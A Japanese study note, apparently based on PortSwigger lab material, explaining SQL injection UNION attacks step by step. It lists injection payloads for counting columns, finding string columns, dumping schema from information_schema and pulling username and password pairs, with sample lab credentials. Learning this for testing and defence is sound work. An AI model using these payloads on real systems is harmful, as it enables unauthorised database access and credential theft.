## 成功条件

1. アプリがSQLiに脆弱で、クエリの結果がアプリのレスポンスで返される
2. SELECT句で指定したカラム数と同じでなければならない
	- つまり、`SELECT a, b FROM...`なら、 UNION句でも `UNION SELECT c, d FROM...`とする必要がある

3. 各カラムは、SELECTとUNIONのクエリ間で同じデータ型でなければならない
	- つまり、`SELECT a, b ~ UNION SELECT c, d ~`とするなら、aとc,bとdは同じデータ型である必要がある

###### 条件を満たすかの調査

- 元々のクエリから返されるカラムの数を数える
- 元々のクエリから返されたどのカラムが、抽出したいデータのデータ型と同じか確認する

### UNION攻撃概要

- UNIONキーワードを使用してDB内の他のテーブルからデータを取得する

###### UNIONの動き

- UNION キーワードを使用すると、追加で1 つ以上のSELECT クエリを実行し、その結果を元のクエリの結果に追加することができる。
- 例(\*1)
```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```
- このSQLクエリは、table1のカラムaとb、table2のカラムcとdの値を含む、2つの列を持つ1つの結果セットを返す

- UNION ALLと異なり、重複は除外
- 複数の結果を統合して1つの結果として取得する。
- UNION句の前のSELECT文で選択したカラムの数と名前が基準となる。
- \*1と同じクエリなら、結果は以下のようになる

a | b
--|--
table1のaのvalue|table1のbのvalue
table2のcのvalue|table2のdのvalue

## UNION攻撃の準備

### ステップ1: 必要な列の数を割り出す

- [2. SQLi UNION攻撃](2.%20SQLi%20UNION攻撃.md#成功条件)の2を満たすため。

#### 方法①：ORDER BY（優先度高）

1. 存在し得ないカラムを指定し、文法のミスがないかを確かめる
```sql
' ORDER BY hogefoo -- //
```

2. エラーが発生するまでカラムインデックスをインクリメントする（エラーが発生する*直前*の値がカラム数）
```sql
' ORDER BY 1-- //
' ORDER BY 2-- //
' ORDER BY 3-- //
	⋮
```
- ==ORDER BY句ではカラムをインデックスで指定できる。==カラム名がわからなくてもいい
	- つまり、table1がa, b, cの3つのカラムで構成されているなら、`ORDER BY 2`でbを基準にソートできる。
- `ORDER BY 1`は確実に成功するはずなので、これでも成功しないなら、コメントアウトの文法が異なる等の原因が考えられる
###### インデックスが結果セット内の実際のカラム数をオーバーした場合の反応

- 以下のいずれにせよ、レスポンスに何か違いがあれば、クエリから返されるカラムの数を推測できる
	- DBエラー：`The ORDER BY position number 3 is out of range of the number of items in the select list.`
	- 一般的なエラー
	- 単に結果が返ってこない

#### 方法②：UNION SELECT（優先度低）

- 異なる数のNULL値を指定していく。
- ==NULLはあらゆる一般的なデータ型に変換可能である==。
- UNIONでは各列のデータ型が元のクエリと注入されたクエリの間で互換性がなければならない。
```sql
' UNION SELECT NULL-- //
' UNION SELECT NULL,NULL-- //
' UNION SELECT NULL,NULL,NULL-- //
	⋮
```
- NULLの数が一致したとき→DBは結果セットに追加の行を返し、各カラムにNULL値を含む(下図では何も記載がない行が見える)
![[Pasted image 20231105122730.png | 300]]

###### NULLの数とカラムの数が一致しないときの反応

- DBエラー：`All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.`
- 一般的なエラー
- 単に結果が返ってこない
- *NullPointerException*（NULL値が指定されたとき例外処理が稼働）：これがあると、NULL値の数が一致してもしなくても同じレスポンスが返ってくるので[2. SQLi UNION攻撃](2.%20SQLi%20UNION攻撃.md#②UNION%20SELECTを使う)は不可能。

##### 🚨RDBごとの文法の違いによる注意点

- 詳しくは[SQLi cheet sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)を参照

###### Oracleの場合

- すべてのSELECTクエリはFROM句が必ず必要
- Oracleには`dual`という組込みテーブルがあるのでこれを利用する。したがって、UNIONでの方法を例に示すと以下のようになる
```sql
' UNION SELECT NULL FROM DUAL-- //
' UNION SELECT NULL,NULL FROM DUAL-- //
	⋮
```
###### MySQLの場合

- `--`のあとに、スペースが必要。`//`を追加することで、Webアプリが実施するかもしれないスペースの削除を防ぐ。
- `#`でもコメントと認識させられる。この場合スペースはいらない。

### ステップ2：有用なデータ型(文字列型)をもつカラムを割り出す

- どのカラムが、抽出したいデータのデータ型と同じか判別する([2. SQLi UNION攻撃](2.%20SQLi%20UNION攻撃.md#成功条件)の3を満たすため)
-  入手したい情報は主に文字列型のデータであるため、文字列型のカラムを1つ以上探す

#### UNION SELECTを使う

- 例えば必要なカラムの数が4つで、抽出したいデータが文字列型の場合

1. すべてのカラムを同時にテストする
```sql
' UNION SELECT 'a1','a2','a3','a4' -- //
```
（どのカラムがWebアプリ上でどこに表示されるのかを確かめるために連番としている。この情報は、後でどのカラムの情報が入手したい情報なのか、当たりをつけるために使う。）

2. ステップ１で失敗したら、個々のカラムをテストしていく
```sql
' UNION SELECT 'a',NULL,NULL,NULL -- //
' UNION SELECT NULL,'a',NULL,NULL -- //
' UNION SELECT NULL,NULL,'a',NULL -- //
' UNION SELECT NULL,NULL,NULL,'a' -- //
```
（DBのID列(1列目)は通常、エンドユーザーにとって有用な情報ではないため、Webアプリは出力を省略していることが多い。）

💡Webアプリの検索機能にUNION SELECTを使う時は、クオテーションの前に`%`を使用することで、すべてのテーブルの値を表示できる可能性がある
```sql
%' UNION SELECT 'a1','a2','a3','a4' -- //
```

###### 失敗の反応

- カラムのデータ型と文字列データが互換性がない場合、注入されたクエリは次のようなDBエラーを起こす
- `Conversion failed when converting the varchar value 'a' to data type int.`
- またはInternal Server error

###### 成功反応

- エラーが発生せず、レスポンスに注入した文字列の値を含む追加コンテンツが含まれている場合、そのカラムは文字列型データの取得に使える。
- 抽出したいデータと型が一致するカラムが見つかれば見つかるほどいいので、例えば2つめのカラムが該当のデータ型なら、そこはそのままにして他のカラムも検査する
```sql
' UNION SELECT NULL,'a','a',NULL-- 
' UNION SELECT NULL,'a',NULL,'a'-- 
```

## UNION攻撃の実行

1. 現在のデータベースから、テーブル名・カラム名を出力
```mysql
' UNION SELECT NULL, table_name, column_name, table_schema, NULL FROM information_schema.columns WHERE table_schema=database() -- //
```

2. ターゲットのテーブルから情報を取得
```sql
' UNION SELECT username, password FROM users -- //
```

### 1つのカラムで複数のデータを抽出する方法

- 値を連結することで、1つのカラム内で複数の値をまとめて取得することができる
- 用途：抽出したいデータが複数あるが、抽出したいデータ型と同じデータ型をもつカラムが1つしかないとき。

- ==RDBごとの連結の方法==は[SQLi cheet sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)の「String concatenation」を参照

- 例：Oracleの場合
```sql
' UNION SELECT username || '~' || password FROM users -- //
```
```
...
administrator~s3cure
wiener~peter
carlos~montoya
...
```
- `||`はOracleの連結演算子
- `~`はセパレータ
